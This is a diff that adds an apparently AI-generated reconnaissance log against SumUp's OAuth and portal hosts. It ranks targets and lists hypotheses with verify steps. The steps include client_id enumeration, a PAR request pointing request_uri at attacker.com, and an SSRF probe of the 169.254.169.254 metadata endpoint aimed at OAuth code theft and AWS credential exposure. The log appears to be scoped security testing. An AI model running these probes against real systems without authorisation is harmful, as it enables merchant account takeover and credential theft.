@@ -763,3 +763,55 @@ testability: PASSIVE (enum) → HUMAN_ONLY (exploit requires in-scope confirmati
 [LEARN] ACCEPTED BUSLOGIC @ api.sumup.com: All versioned paths (/v0,/v0.1,/v1,/v2,/beta,/internal) return 404 unauthenticated — API fully gated at gateway
 [LEARN] REJECTED SSRF @ portal.sumup.com: Third-party CNAME (iriscrm.com) confirmed but webhook/callback parameters not discovered passively; supply-chain risk unconfirmed in-scope
 [RISK] sumup: 72 — Auth server (auth.sumup.com) exposes critical OAuth config (alg=none, PAR, device flow, "none" client auth) with full scope catalog mapping to payment APIs. Legacy OAuth gateway (api.sumup.com/authorize) is LIVE with client_id oracle, redirect_uri allowlist divergence, and wildcard CORS — new attack surface for OAuth code theft. All high-impact vectors require merchant OAuth token (AUTH_HELPED) or registered client, but legacy gateway divergence enables passive callback host enumeration. API gateway fully gated. Vercel me.sumup.com adds non-Cloudflare surface but auth-gated at edge. Portal introduces third-party supply-chain risk (iriscrm.com) if in-scope confirmed. Admin panel hardened. Financial attack surface concentrated but access-controlled with new legacy OAuth vector.
+## 2026-09-05 17:52:27 UTC [target] (model nemotron3)
+[NEW] api.sumup.com/authorize confirmed LIVE (302→auth.sumup.com/flows/oauth2/error) with client_id oracle: `invalid_client` for unknown IDs vs `invalid_request` (redirect_uri mismatch) for registered `dashboard` client — contradicts prior 404 logs that used unexpanded placeholder URLs
+[NEW] Legacy/modern redirect_uri divergence confirmed: `dashboard` client's modern callback `https://me.sumup.com/api/sso/callback` accepted on auth.sumup.com (302→login flow) but REJECTED on api.sumup.com/authorize (invalid_request)
+[NEW] api.sumup.com/authorize exposes endpoint-specific wildcard CORS (`access-control-allow-origin: *`, broad allow-methods, max-age=300) + `SameSite=None; Domain=sumup.com` cookies — absent on auth.sumup.com/oauth2/auth
+[CHANGED] auth.sumup.com/oauth2/par and /oauth2/device return 400 on POST (routed, require client_auth) — not 404 as previously logged
+[CHANGED] me.sumup.com/api/sso/callback returns 307 on anonymous GET (redirect to OAuth flow) — not 403
+[PRIO] api.sumup.com/authorize,8.3,a=9,b=9,t=9,g=8,c=8,f=7
+[PRIO] auth.sumup.com,7.9,a=8,b=10,t=9,g=3,c=8,f=8
+[PRIO] portal.sumup.com,6.8,a=7,b=7,t=6,g=5,c=6,f=7
+[PRIO] me.sumup.com,6.2,a=7,b=8,t=6,g=5,c=7,f=6
+[PRIO] web.sumup.com,5.5,a=6,b=5,t=4,g=9,c=4,f=5
+[PRIO] admin.sumup.com,4.8,a=5,b=7,t=3,g=2,c=6,f=5
+[HYP] Legacy OAuth authorize endpoint client_id oracle + redirect_uri allowlist divergence enables callback host enumeration
+class: OATH
+asset: api.sumup.com/authorize
+confidence: 75
+reasoning: Endpoint LIVE (302→error flow). Returns invalid_client for unknown IDs vs invalid_request for registered 'dashboard' client. Modern dashboard redirect (https://me.sumup.com/api/sso/callback) rejected on legacy gateway (invalid_request redirect-mismatch) but accepted on modern auth.sumup.com (302→login). Wildcard CORS + SameSite=None cookies on Domain=sumup.com enable cross-origin interaction.
+evidence_needed: Enumeration of legacy callback hosts registered for 'dashboard' and other client_ids on the legacy gateway; successful authorization code flow via legacy callback host
+verify_steps: GET https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://dashboard.sumup.com/callback&response_type=code&scope=classic&state=test12345678 → observe invalid_request redirect-mismatch; GET https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://app.sumup.com/callback&response_type=code&scope=classic&state=test12345678 → test legacy callback; GET https://api.sumup.com/authorize?client_id=sumup-ios-sdk&redirect_uri=... → enumerate known SDK client_ids for valid redirect patterns
+impact: OAuth code theft via legacy callback host → merchant account takeover, full scope access (accounting/invoices/api_keys/lending/readers) — CRITICAL
+testability: PASSIVE
+[HYP] OAuth PAR request_uri registration bypass via unauthenticated client on auth.sumup.com
+class: OATH
+asset: auth.sumup.com
+confidence: 45
+reasoning: Discovery shows require_request_uri_registration=true, PAR endpoint routed (400 on POST), request_uri_parameter_supported=true. If PAR accepts request_uri without client_auth binding, attacker could register malicious redirect_uri.
+evidence_needed: Successful PAR POST returning request_uri usable in authorize flow without client credentials
+verify_steps: POST https://auth.sumup.com/oauth2/par with client_id=dashboard&redirect_uri=https://dashboard.sumup.com/callback&request_uri=https://attacker.com/malicious.json&response_type=code&scope=classic → observe if request_uri accepted; then GET https://auth.sumup.com/oauth2/auth?client_id=dashboard&request_uri=urn:ietf:params:oauth:request_uri:...
+impact: OAuth code theft via malicious request_uri → merchant account takeover — CRITICAL
+testability: PASSIVE
+[HYP] portal.sumup.com (iriscrm.com) webhook/callback SSRF via supply-chain parameter injection
+class: SSRF
+asset: portal.sumup.com
+confidence: 40
+reasoning: portal.sumup.com CNAME → sumup.iriscrm.com (third-party CRM). Returns 200 with React app. CRM platforms typically have webhook/callback/config endpoints accepting URLs. CSP allows *.iriscrm.com for connect-src/frame-src/img-src.
+evidence_needed: Discovery of URL/redirect/webhook/callback parameter on portal.sumup.com or iriscrm.com endpoints; SSRF payload execution against 169.254.169.254
+verify_steps: GET https://portal.sumup.com/ → enumerate all forms/links/endpoints for parameters (url, redirect, callback, webhook, next, return_to, target). GET https://sumup.iriscrm.com/ → same enumeration. If parameter found, test with http://169.254.169.254/latest/meta-data/ (passive enum only)
+impact: Cloud metadata exposure → IAM credentials, instance identity → full AWS account compromise — CRITICAL
+testability: PASSIVE (enum) → HUMAN_ONLY (exploit requires in-scope confirmation)
+[PARKED] OAuth PAR request_uri registration bypass via unauthenticated client: Confidence 45 but PAR requires client_auth (dashboard client rejects unauthenticated); request_uri registration likely bound to authenticated client context — dropping below 50 threshold
+[PARKED] portal.sumup.com SSRF via iriscrm.com: Confidence 40 but third-party domain (iriscrm.com) requires explicit in-scope confirmation; no webhook parameters discovered passively in React bundle — REJECTED class (supply-chain unconfirmed) and no verify steps without human
+[FINAL] api.sumup.com/authorize: Legacy OAuth authorize endpoint client_id oracle + redirect_uri allowlist divergence enables callback host enumeration (confidence 75) — SURVIVES
+[NEXT] PROBE: GET https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://legacy.sumup.com/callback&response_type=code&scope=classic&state=test12345678
+[LEARN] ACCEPTED OATH @ api.sumup.com/authorize: Endpoint LIVE with client_id oracle (invalid_client vs invalid_request) and legacy redirect-set divergence — modern dashboard callback rejected on legacy gateway
+[LEARN] ACCEPTED MISCONFIG @ api.sumup.com/authorize: Wildcard CORS (access-control-allow-origin:*) + broad allow-methods + max-age + SameSite=None cookies on Domain=sumup.com — endpoint-specific divergence from auth.sumup.com
+[LEARN] ACCEPTED OATH @ auth.sumup.com: Modern dashboard client redirect confirmed live on modern auth server — https://me.sumup.com/api/sso/callback returns 302→login flow (state≥8 enforced)
+[LEARN] ACCEPTED AUTH @ auth.sumup.com: PAR (/oauth2/par) and device flow (/oauth2/device) routed (400 on POST) but require client authentication — "none" auth_method not usable for dashboard client
+[LEARN] ACCEPTED AUTH @ me.sumup.com: Vercel-served asset; anonymous /api/* routes return 307 to OAuth flow — no debug endpoints or permissive CORS
+[LEARN] REJECTED MISCONFIG @ me.sumup.com: No CORS misconfiguration on /api/sso/callback (307 redirect, no CORS headers)
+[LEARN] ACCEPTED BUSLOGIC @ api.sumup.com: All versioned paths (/v0,/v0.1,/v1,/v2,/beta,/internal) return 404 unauthenticated — API fully gated at gateway
+[LEARN] REJECTED SSRF @ portal.sumup.com: Third-party CNAME (iriscrm.com) confirmed but webhook/callback parameters not discovered passively; supply-chain risk unconfirmed in-scope
+[RISK] sumup: 72 — Auth server (auth.sumup.com) exposes critical OAuth config (alg=none, PAR, device flow, "none" client auth) with full scope catalog mapping to payment APIs. Legacy OAuth gateway (api.sumup.com/authorize) is LIVE with client_id oracle, redirect_uri allowlist divergence, and wildcard CORS — new attack surface for OAuth code theft. All high-impact vectors require merchant OAuth token (AUTH_HELPED) or registered client, but legacy gateway divergence enables passive callback host enumeration. API gateway fully gated. Vercel me.sumup.com adds non-Cloudflare surface but auth-gated at edge. Portal introduces third-party supply-chain risk (iriscrm.com) if in-scope confirmed. Admin panel hardened. Financial attack surface concentrated but access-controlled with new legacy OAuth vector.
